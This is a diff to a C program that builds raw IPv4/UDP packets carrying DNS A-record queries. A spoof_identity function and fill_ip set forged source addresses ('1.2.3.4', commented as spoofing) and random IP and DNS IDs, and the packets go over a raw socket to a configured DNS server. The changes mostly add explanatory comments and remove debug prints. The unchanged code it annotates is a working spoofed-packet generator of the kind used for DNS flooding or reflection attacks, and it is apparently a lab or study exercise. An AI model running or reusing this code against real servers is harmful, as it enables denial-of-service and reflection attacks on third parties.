@@ -40,44 +40,43 @@ void spoof_identity(struct iphdr *ip, struct dns_header *dns_h) {
 	ip -> saddr = inet_addr(ip_addr);
 	ip->id = htons(rand() & 0xFFFF);
 	dns_h->xid= htons(rand()& 0xFFFF); 
-	// printf("Spoofed ip: %s\n",ip_addr);
 }
 
 
 void fill_ip(struct iphdr *ip) {
-    ip->ihl      = 5;
-    ip->version  = 4;
+    ip->ihl      = 5;  // Header size = 5 * 32 bit
+    ip->version  = 4;  // IPv4
     ip->tos      = 16; // low delay
-    ip->id       = htons(rand() & 0xFFFF);
+    ip->id       = htons(rand() & 0xFFFF); // randomly assignning ip-id
     ip->ttl      = 64; // hops
     ip->protocol = 17; // UDP
-    ip->saddr = inet_addr("1.2.3.4");
-    ip->daddr = inet_addr(DNS_SERVER);
+    ip->saddr = inet_addr("1.2.3.4");   //spoofing ip
+    ip->daddr = inet_addr(DNS_SERVER);  // DNS ip
 }
 
 void fill_udp(struct udphdr *udp, size_t len) {
-    udp->source = htons(10);
-    udp->dest = htons(DNS_PORT);
-    udp->len = htons(len);
+    udp->source = htons(10);        // source port
+    udp->dest = htons(DNS_PORT);    // DNS port
+    udp->len = htons(len);          // length of UDP header + DNS header + DNS question
 }
 
 void fill_sin(struct sockaddr_in *sin) {
-    sin->sin_family = AF_INET;
+    sin->sin_family = AF_INET;  // IP Address Family
     sin->sin_port = htons(DNS_PORT);
     sin->sin_addr.s_addr = inet_addr(DNS_SERVER);
 }
 
 void fill_dns_header(struct dns_header *dns_h) {
-    dns_h->xid= htons(rand()& 0xFFFF);    /* Randomly chosen ID */
-    dns_h->flags = htons(0x0100); /* Q=0, RD=1 */
-    dns_h->qdcount = htons (1);    /* Sending 1 question */
+    dns_h->xid= htons(rand()& 0xFFFF);  // randomly assigning dns-id
+    dns_h->flags = htons(0x0100);  // recursion desired
+    dns_h->qdcount = htons (1);    // 1 question
     dns_h->ancount = 0;
     dns_h->nscount = 0;
     dns_h->arcount = 0;
 };
 
 char *build_domain_qname (char *hostname) {
-	char *name = calloc(strlen (hostname) + 1, sizeof (char));
+	char *name = calloc(strlen (hostname) + 1, sizeof (char));  // 1 extra for the inital octet
 
 	/* Leave the first byte blank for the first field length */
 	memcpy(name + 1, hostname, strlen (hostname));
@@ -103,8 +102,8 @@ size_t fill_dns_question(char* buffer) {
     int len = 0;
     struct dns_question question;
     question.name = build_domain_qname(DOMAIN_NAME);
-	question.dnstype = htons(1);  /* QTYPE 1=A */
-	question.dnsclass = htons(1); /* QCLASS 1=IN */
+	question.dnstype = htons(1);   // QTYPE A records
+	question.dnsclass = htons(1);  // QCLASS Internet Addresses
 
     memcpy(buffer, question.name, strlen(question.name) + 1);
     buffer += strlen(question.name) + 1 ;
@@ -134,8 +133,6 @@ int main() {
 
     struct dns_header *dns_h = (struct dns_header *) (buffer + pos);
     pos += sizeof(struct dns_header);
-
-    printf("%d %d %d\n", sizeof(struct iphdr), sizeof(struct udphdr), sizeof(struct dns_header));
 
 
     int sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
